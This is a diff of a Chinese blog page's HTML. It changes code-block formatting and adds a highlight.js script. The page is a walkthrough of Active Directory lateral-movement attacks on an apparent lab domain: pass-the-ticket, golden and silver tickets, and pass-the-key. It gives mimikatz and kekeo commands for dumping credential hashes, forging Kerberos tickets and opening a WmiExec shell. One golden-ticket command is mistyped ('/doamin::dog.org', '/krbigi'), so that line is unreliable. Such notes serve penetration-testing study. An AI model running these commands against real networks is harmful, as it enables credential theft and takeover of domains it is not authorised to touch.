 <p><strong>利用工具</strong> </p>
@@ -590,11 +645,10 @@
 <p><strong>利用步骤</strong></p>
 <ol>
 <li><p>生成票据</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # "tgt::ask /user:mary /domain:god.org /ntlm:<span class="number">518</span>b98ad4178a53695dc997aa02d455c"</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">kekeo # &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</code></pre>
 </li>
 <li><p>导入票据</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # "kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi"</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">kekeo # &quot;kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot;</code></pre>
 </li>
 </ol>
 <h4 id="Golden-ticket"><a href="#Golden-ticket" class="headerlink" title="Golden ticket"></a>Golden ticket</h4><p><strong>前提条件</strong></p>
@@ -607,30 +661,28 @@
 <p><strong>利用步骤</strong></p>
 <ol>
 <li><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # lsadump::lsa /patch</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch</code></pre>
 </li>
 <li><p>切换到普通域用户的机器，生成TGT凭证,用户名为administrator</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /user:administrator /doamin::dog.org /sid:[SID] /krbigi:[NTLM]</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">mimikatz # kerberos::golden /user:administrator /doamin::dog.org /sid:[SID] /krbigi:[NTLM]</code></pre>
 </li>
 <li><p>使用mimikatz将凭证注入进去</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">mimikatz # kerberos::ptt ticket.kirbi</code></pre>
 </li>
 <li><p>如果主机开启了RPC服务，还可以使用WmiExec.vbs直接连接：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript "wmiexe v1.<span class="number">1</span>.vbs" /shell <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span></span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code class="cmd">cscript &quot;wmiexe v1.1.vbs&quot; /shell 192.168.3.21</code></pre>
 </li>
 </ol>
 <h4 id="Silver-ticket"><a href="#Silver-ticket" class="headerlink" title="Silver ticket"></a>Silver ticket</h4><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p>
 <p><strong>利用步骤</strong></p>
 <ol>
 <li><p>首先登录域控，dump机器hash</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords</code></pre>
 </li>
 <li><p>将hash保存下来，在普通域用户机器中进行ptt</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /domain:god.org /sid:[SID]  /target:<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> /rc4:[NTLM]  /service:cifs /user:mary /ptt</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">mimikatz # kerberos::golden /domain:god.org /sid:[SID]  /target:192.168.3.21 /rc4:[NTLM]  /service:cifs /user:mary /ptt</code></pre>
 <blockquote>
 <p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统</p>
 </blockquote>
@@ -639,11 +691,10 @@
 <h3 id="Ptk（Pass-the-key）"><a href="#Ptk（Pass-the-key）" class="headerlink" title="Ptk（Pass the key）"></a>Ptk（Pass the key）</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes key（使用sekurlsa::ekeys导出来），就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p>
 <h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ol>
 <li><p>获取用户的aes key</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "privilege::debug" "sekurlsa::ekeys"</span><br></pre></td></tr></table></figure>
+<pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></pre>
 </li>
 <li><p>注入aes key</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "privilege::debug" "sekurlsa::pth /user:mary /domain:god.org /aes256:[aes256_hmac]"</span><br></pre></td></tr></table></figure>
-
+<pre><code class="cmd">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:mary /domain:god.org /aes256:[aes256_hmac]&quot; </code></pre>
 </li>
 </ol>
 <blockquote>
@@ -797,7 +848,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -810,7 +861,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -901,6 +952,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
